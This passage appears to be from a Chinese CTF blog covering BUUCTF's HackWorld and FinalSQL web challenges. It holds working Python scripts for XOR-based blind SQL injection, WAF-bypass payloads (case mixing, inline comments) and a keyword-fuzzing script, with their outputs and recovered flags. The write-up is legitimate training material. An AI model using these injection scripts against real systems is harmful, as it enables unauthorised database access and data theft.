class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+length(database())%3D4+%23&amp;Submit=Submit#</span><br><br>url = <span class="hljs-string">&#x27;http://cbdddd87-2da0-4863-a3fa-3afcff406fb8.node4.buuoj.cn:81/index.php&#x27;</span><br>n = <span class="hljs-number">1</span><br><span class="hljs-comment"># 对数据库名字第n个字符进行暴力剖解</span><br><span class="hljs-comment"># payload:1&#x27; and ascii(substr(database(),n,1))&gt;100</span><br>database_name = <span class="hljs-string">&quot;&quot;</span><br>database_lenth = <span class="hljs-number">30</span> <span class="hljs-comment"># 手动规定数据库名字长度</span><br><span class="hljs-keyword">while</span> n &lt;= database_lenth:<br>    <span class="hljs-comment"># 从可打印字符开始</span><br>    begin = <span class="hljs-number">32</span><br>    end = <span class="hljs-number">126</span><br>    tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># 对第n个字符进行判断</span><br>    <span class="hljs-keyword">while</span> (begin &lt; end):<br>        <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>        <span class="hljs-comment"># payload1:用于普通盲注</span><br>        <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr(database()%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(n, tmp)</span><br>        <br>        <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;1^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(n, tmp)<br>        payload2 = &#123;<br>            <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-built_in">str</span><br>        &#125;<br>        <span class="hljs-comment"># print(begin,end,tmp)</span><br>        <span class="hljs-comment"># 构造url请求,并存储返回的网页响应结果</span><br>        <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # 用于补全网页的url</span><br>        <span class="hljs-comment"># print(url + payload2)</span><br>        r = requests.post(url=url, data=payload2)<br>        <span class="hljs-comment"># 判断该payload所返回的网页是true界面还是false界面</span><br>        true_text = <span class="hljs-string">&quot;Error&quot;</span><br>        <span class="hljs-comment"># print(r.text)</span><br>        <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>            <span class="hljs-comment"># 返回true界面 </span><br>            begin = tmp + <span class="hljs-number">1</span><br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 返回flase界面</span><br>            end = tmp<br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>    <span class="hljs-comment"># print(tmp)</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该数据库的第%d个字符:%c&quot;</span> % (n, <span class="hljs-built_in">chr</span>(tmp)))<br>    database_name = database_name + <span class="hljs-built_in">chr</span>(tmp)<br>    <span class="hljs-comment"># 对下一个字符进行判断</span><br>    n = n + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该数据库的名字为：&quot;</span>+database_name)<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">该数据库的名字为：ctftraih<br></code></pre></td></tr></table></figure><p>第二步：由于由题目提示得，flag在flag表的flag字段中，所以直接爆flag字段信息即可:</p><p>select被过滤的绕过方式:</p><p>大小写绕过法:</p><p>该方法适用于任何在mysql中执行的单词代码</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs txt">seleCt<br>SeLeCt<br>SELect<br>.......<br></code></pre></td></tr></table></figure><p>测试:</p><p><img src="/images/2023-8-28-HackWorld/image-20230828152946191.png" alt="image-20230828152946191"></p><p>内联注释绕过:</p><p>当一些关键语句被过滤时，内联注释就是把一些特有的仅在 mysql 上的语句放在 &#x2F;*!  *&#x2F;中，这样这些语句如果在其它数据库中是不会被执行，但在 mysql 中会执行.</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs txt">/*!select*/<br>/*!sElect*/<br>.....<br></code></pre></td></tr></table></figure><p>测试:</p><p><img src="/images/2023-8-28-HackWorld/image-20230828153246186.png" alt="image-20230828153246186"></p><p>使用大小写绕过方式测试:</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1seLeCt<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-HackWorld/image-20230828153509802.png" alt="image-20230828153509802"></p><p>通过响应结果可知，可以绕过</p><p>由于group_concat也被过滤，且通过不断尝试，发现大小写都无法绕过，这里我们直接猜测该flag字段只有一行内容，且为flag的值</p><p>测试:</p><p><img src="/images/2023-8-28-HackWorld/image-20230828154057973.png" alt="image-20230828154057973"></p><p>只有substr中select返回的只有一行内容时，才不会发生报错</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1^(ascii(substr((seLEct(&#123;flag&#125;)from(&#123;flag&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br><span class="hljs-comment"># headers = &#123;&#x27;Cookie&#x27;:&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;,</span><br><span class="hljs-comment">#            &#x27;Referer&#x27;:&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br><span class="hljs-comment">#            &#125;</span><br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+ascii(substr((select+user+from+dvwa.users+limit+0%2C1)%2C1%2C1))%3D110+%23</span><br><br>url = <span class="hljs-string">&#x27;http://cbdddd87-2da0-4863-a3fa-3afcff406fb8.node4.buuoj.cn:81/index.php&#x27;</span><br><br><span class="hljs-comment"># database_name存储数据库名字</span><br>database_name = <span class="hljs-string">&quot;ctftraih&quot;</span><br><span class="hljs-comment"># table_name存储指定表的名字</span><br>table_name = <span class="hljs-string">&quot;flag&quot;</span><br><span class="hljs-comment"># col_name存储指定字段的名字</span><br>col_name = <span class="hljs-string">&quot;flag&quot;</span><br><span class="hljs-comment"># col_data_num存储有多少列</span><br><span class="hljs-comment"># 手动指定要查看多少列数据，由于合在一起显示所以只有一列</span><br>col_data_num = <span class="hljs-number">1</span><br><span class="hljs-comment"># col_data_charnum存储每个字段数据的字符个数</span><br><span class="hljs-comment"># 手动指定要查看多少字符数据</span><br>col_data_charnum = <span class="hljs-number">50</span><br><br>rank_index = <span class="hljs-number">0</span><br><span class="hljs-comment"># 先遍历该字段有多少列</span><br><span class="hljs-keyword">while</span> (rank_index &lt; col_data_num):<br>    rank_data_index = <span class="hljs-number">0</span><br>    <span class="hljs-comment"># data用来字段该列的数据</span><br>    data = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">while</span> (rank_data_index &lt; col_data_charnum):<br>        <span class="hljs-comment"># 用二分法对当前字段进行猜解</span><br>        <span class="hljs-comment"># 从可打印字符开始</span><br>        begin = <span class="hljs-number">32</span><br>        end = <span class="hljs-number">126</span><br>        tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 对第n个字符进行判断</span><br>        <span class="hljs-keyword">while</span> (begin &lt; end):<br>            <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>            <span class="hljs-comment"># payload1:用于普通盲注</span><br>            <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr((select+&#123;&#125;+from+&#123;&#125;.&#123;&#125;+limit+&#123;&#125;%2C1)%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(col_name, database_name, table_name, rank_index, rank_data_index+1, tmp)</span><br>            <span class="hljs-comment"># payload2 = &quot;1^(ascii(substr((select(GROUP_CONCAT(&#123;&#125;))from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;.format(col_name, table_name, rank_data_index+1, tmp)</span><br>            <span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;1^(ascii(substr((seLEct(&#123;&#125;)from(&#123;&#125;)),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(col_name, table_name, rank_data_index+<span class="hljs-number">1</span>, tmp)<br>            <span class="hljs-comment"># print(str)</span><br>            payload2 = &#123;<br>                <span class="hljs-string">&quot;id&quot;</span>: <span class="hljs-built_in">str</span><br>            &#125;<br>            <span class="hljs-comment"># print(table_name[table_index], col_index, col_len_index, tmp)</span><br>            <span class="hljs-comment"># 构造url请求,并存储返回的网页响应结果</span><br>            <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # 用于补全网页的url</span><br>            <span class="hljs-comment"># print(url + payload1 + str)</span><br>            r = requests.post(url=url, data=payload2)<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>            <span class="hljs-comment"># 判断该payload所返回的网页是true界面还是false界面</span><br>            true_text = <span class="hljs-string">&quot;Error&quot;</span><br>            <span class="hljs-comment"># print(r.text)</span><br>            <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>                <span class="hljs-comment"># 返回true界面 </span><br>                <span class="hljs-comment"># print(&quot;true&quot;)</span><br>                begin = tmp + <span class="hljs-number">1</span><br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># 返回flase界面</span><br>                end = tmp<br>                tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>        <span class="hljs-comment"># print(tmp)</span><br>        data = data + <span class="hljs-built_in">chr</span>(tmp)<br>        <span class="hljs-comment"># 继续下一个字符</span><br>        rank_data_index = rank_data_index + <span class="hljs-number">1</span><br>    <span class="hljs-comment"># 继续下一列</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;&#123;&#125;字段第&#123;&#125;列的值:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(col_name, rank_index + <span class="hljs-number">1</span>, data))<br>    rank_index = rank_index + <span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">flag字段第1列的值:flag&#123;8ee345ea-b7e7-4384-883c-f953214c7f79&#125; <br></code></pre></td></tr></table></figure><p>flag &#x3D; flag{8ee345ea-b7e7-4384-883c-f953214c7f79} </p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF_WEB_[极客大挑战 2019]FinalSQL 题解</title>
    <link href="/2023/08/28/2023-08-28-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DFinalSQL/"/>
    <url>/2023/08/28/2023-08-28-%5B%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019%5DFinalSQL/</url>
    
    <content type="html"><![CDATA[<h2 id="极客大挑战-2019-FinalSQL"><a href="#极客大挑战-2019-FinalSQL" class="headerlink" title="[极客大挑战 2019]FinalSQL"></a>[极客大挑战 2019]FinalSQL</h2><p>1.进入页面:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094221524.png" alt="image-20230828094221524"></p><p>发现题目提示有盲注</p><p>2.由于我们不知道正确的用户名和密码，所以我们不能通过用户名密码的输入来获取true和false页面的响应，因为在不知道正确的用户名和密码的情况下，无论如何返回的都是false界面，所以我们需要寻找其它的盲注注入点</p><p>3.根据题目提示选择神秘代码:<br>点击1:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094621301.png" alt="image-20230828094621301"></p><p>点击2：</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094644745.png" alt="image-20230828094644745"></p><p>点击3：</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094710975.png" alt="image-20230828094710975"></p><p>点击4：</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094729078.png" alt="image-20230828094729078"></p><p>点击5：</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828094752529.png" alt="image-20230828094752529"></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=6<br></code></pre></td></tr></table></figure><p><img src="/images/2023-8-28-FinalSQL/image-20230828094924021.png" alt="image-20230828094924021"></p><p>没有获得有用的信息，但是我们可以通过id这个注入点进行盲注</p><p>4.盲注原理:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs txt">布尔盲注:<br>id=1 and 非0(true)<br>返回id=1的界面<br>id=1 and 0(flase)<br>返回id=0的界面<br><br>异或盲注:<br>id=1^0(false)=&gt;1<br>返回id=1的界面<br>id=1^1(true)=&gt;0<br>返回id=0的界面<br>使用异或盲注需要后面有判断语句返回true和false<br><br>空字符或盲注:<br>id=&#x27;&#x27; or 非0(true)=&gt;1<br>返回id=1的界面<br>id=&#x27;&#x27; or 0(flase)=&gt;0<br>返回id=0的界面<br></code></pre></td></tr></table></figure><p>测试:</p><p>mysql中true表示1:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828100019926.png" alt="image-20230828100019926"></p><p>mysql中false表示0:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828100110579.png" alt="image-20230828100110579"></p><p>5.随便注入，查看当前页面过滤的内容:</p><p>脚本:</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># 打开读取SQL_fuzz文件</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;SQL_fuzz.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    contents = f.readlines()<br>    <span class="hljs-comment"># print(contents)</span><br><span class="hljs-comment"># 删除读取数据中的&#x27;\n&#x27;</span><br>data_list = []<br><span class="hljs-keyword">for</span> msg <span class="hljs-keyword">in</span> contents:<br>    msg = msg.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)<br>    <span class="hljs-comment"># # 字符串根据空格进行分割</span><br>    <span class="hljs-comment"># d = msg.split(&#x27; &#x27;)</span><br>    data_list.append(msg)<br>f.close<br><span class="hljs-comment"># print(data_list)</span><br><br><span class="hljs-comment"># 进行fuzz注入</span><br>url = <span class="hljs-string">&quot;http://3f8893c2-6eda-4113-bcfa-2b6188684bd7.node4.buuoj.cn:81/search.php?id=&quot;</span><br><span class="hljs-comment"># GET请求</span><br><span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> data_list:<br>    r = requests.get(url+data)<br>    <span class="hljs-comment"># 使用time使请求能够拥有足够的时间去响应</span><br>    time.sleep(<span class="hljs-number">0.04</span>)<br>    <span class="hljs-comment"># 获取过滤网站响应信息</span><br>    reponse_txt = <span class="hljs-string">&quot;臭弟弟&quot;</span><br>    <span class="hljs-keyword">if</span> (reponse_txt <span class="hljs-keyword">in</span> r.text):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该网站过滤了&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(data))<br><br><span class="hljs-comment"># POST请求</span><br><span class="hljs-comment"># for d in data_list:</span><br><span class="hljs-comment">#     payload = &#123;</span><br><span class="hljs-comment">#         &quot;&quot;: d</span><br><span class="hljs-comment">#     &#125;</span><br><span class="hljs-comment">#     r = requests.post(url=url, data=payload)</span><br><span class="hljs-comment">#     reponse_txt = &quot;臭弟弟&quot;</span><br><span class="hljs-comment">#     if (reponse_txt in r.text):</span><br><span class="hljs-comment">#         print(&quot;该网站过滤了&#123;&#125;&quot;.format(data))</span><br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs txt">该网站过滤了length Length<br>该网站过滤了handler<br>该网站过滤了likeLiKe<br>该网站过滤了having<br>该网站过滤了limitLimIt<br>该网站过滤了insertinsERTINSERT<br>该网站过滤了!<br>该网站过滤了%<br>该网站过滤了ANDANd<br>该网站过滤了BYBy<br>该网站过滤了unionUNIonUNION<br>该网站过滤了||<br>该网站过滤了//*<br>该网站过滤了*/*<br>该网站过滤了/**/<br>该网站过滤了anandd<br>该网站过滤了HAVING<br>该网站过滤了IF<br>该网站过滤了INTO<br>该网站过滤了LIKE<br>该网站过滤了|<br>该网站过滤了UNION<br>该网站过滤了AND<br>该网站过滤了drop<br>该网站过滤了DROP<br>该网站过滤了rand()<br>该网站过滤了LIMIT<br>该网站过滤了by<br>该网站过滤了OUTFILE<br>该网站过滤了VARCHAR<br>该网站过滤了/*<br>该网站过滤了mid<br>该网站过滤了RLIKE<br>该网站过滤了sys schemma<br>该网站过滤了%0c<br>该网站过滤了@<br>该网站过滤了else%27%23%22%20<br></code></pre></td></tr></table></figure><p>6.发现and被过滤，所以我们可以采用以下盲注：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs txt">异或盲注:<br>id=1^0(false)=&gt;1<br>返回id=1的界面<br>id=1^1(true)=&gt;0<br>返回id=0的界面<br><br>空字符或盲注:<br>id=&#x27;&#x27; or 非0(true)=&gt;1<br>返回id=1的界面<br>id=&#x27;&#x27; or 0(flase)=&gt;0<br>返回id=0的界面<br></code></pre></td></tr></table></figure><p>测试:</p><p>返回id&#x3D;1:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828140656279.png" alt="image-20230828140656279"></p><p>返回id&#x3D;0:</p><p><img src="/images/2023-8-28-FinalSQL/image-20230828140743288.png" alt="image-20230828140743288"></p><p><strong>使用异或盲注构造payload,由于过滤了limit,所以不能用普通的payload:</strong></p><p>第一步：爆数据库名字的长度,由于length被过滤，所以我们采取暴力破解（规定查找长度为30）</p><p>第二步：爆数据库的名字</p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">1^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># url是随时更新的，具体的以做题时候的为准</span><br><br><span class="hljs-comment"># 登录dvwa的header:</span><br>headers = &#123;<span class="hljs-string">&#x27;Cookie&#x27;</span>:<span class="hljs-string">&#x27;security=low; PHPSESSID=942m2p5g9t4uicc61v7o3gedd7&#x27;</span>,<br>           <span class="hljs-string">&#x27;Referer&#x27;</span>:<span class="hljs-string">&#x27;http://localhost/DVWA/vulnerabilities/sqli_blind/&#x27;</span><br>           &#125;<br><br><span class="hljs-comment"># 当前注入点的url传输格式:</span><br><span class="hljs-comment"># ?id=1&#x27;+and+length(database())%3D4+%23&amp;Submit=Submit#</span><br><br>url = <span class="hljs-string">&#x27;http://6650aff8-185f-482d-8fa4-8cede14a9697.node4.buuoj.cn:81//search.php?id=&#x27;</span><br>n = <span class="hljs-number">1</span><br><span class="hljs-comment"># 对数据库名字第n个字符进行暴力剖解</span><br><span class="hljs-comment"># payload:1&#x27; and ascii(substr(database(),n,1))&gt;100</span><br>database_name = <span class="hljs-string">&quot;&quot;</span><br>database_lenth = <span class="hljs-number">30</span> <span class="hljs-comment"># 手动规定数据库名字长度</span><br><span class="hljs-keyword">while</span> n &lt;= database_lenth:<br>    <span class="hljs-comment"># 从可打印字符开始</span><br>    begin = <span class="hljs-number">32</span><br>    end = <span class="hljs-number">126</span><br>    tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># 对第n个字符进行判断</span><br>    <span class="hljs-keyword">while</span> (begin &lt; end):<br>        <span class="hljs-comment"># 根据当前网页url传输格式构造payload</span><br>        <span class="hljs-comment"># payload1:用于普通盲注</span><br>        <span class="hljs-comment"># payload1 = &quot;1&#x27;+and+ascii(substr(database()%2C&#123;&#125;%2C1))&gt;&#123;&#125;+%23&quot;.format(n, tmp)</span><br>        <br>        payload2 = <span class="hljs-string">&quot;1^(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;)&quot;</span>.<span class="hljs-built_in">format</span>(n, tmp)<br>        <span class="hljs-comment"># print(begin,end,tmp)</span><br>        <span class="hljs-comment"># 构造url请求,并存储返回的网页响应结果</span><br>        <span class="hljs-comment"># str = &quot;&amp;Submit=Submit#&quot; # 用于补全网页的url</span><br>        <span class="hljs-comment"># print(url + payload2)</span><br>        r = requests.get(url + payload2, )<br>        <span class="hljs-comment"># 判断该payload所返回的网页是true界面还是false界面</span><br>        true_text = <span class="hljs-string">&quot;ERROR&quot;</span><br>        <span class="hljs-comment"># print(r.text)</span><br>        <span class="hljs-keyword">if</span> (true_text <span class="hljs-keyword">in</span> r.text):<br>            <span class="hljs-comment"># 返回true界面 </span><br>            begin = tmp + <span class="hljs-number">1</span><br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 返回flase界面</span><br>            end = tmp<br>            tmp = (begin + end) // <span class="hljs-number">2</span><br>    <span class="hljs-comment"># 最终begin==end,而此时的tmp就是该字符的ascii码</span><br>    <span class="hljs-built_in">print</span>(tmp)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该数据库的第%d个字符:%c&quot;</span> % (n, <span class="hljs-built_in">chr</span>(tmp)))<br>    database_name = database_name + <span class="hljs-built_in">chr</span>(tmp)<br>    <span class="hljs-comment"># 对下一个字符进行判断</span><br>    n = n + <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;该数据库的名字为：&quot;</span>+database_name)<br></code></pre></td></tr></table></figure><p>输出:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">该数据库的名字为：geek<br></code></pre></td></tr></table></figure><p>第三步：直接爆表名，手动规定所有表名总长50:</p><p><strong>由于limit被过滤，所以直接用GROUP_CONCAT()获取所有表名</strong></p><p>payload:</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs txt">?id=1^(ascii(substr((select(GROUP_CONCAT(TABLE_NAME))from(information_schema.tables)where(TABLE_SCHEMA=database())),&#123;&#125;,1))&gt;&#123;&#125;)<br></code></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 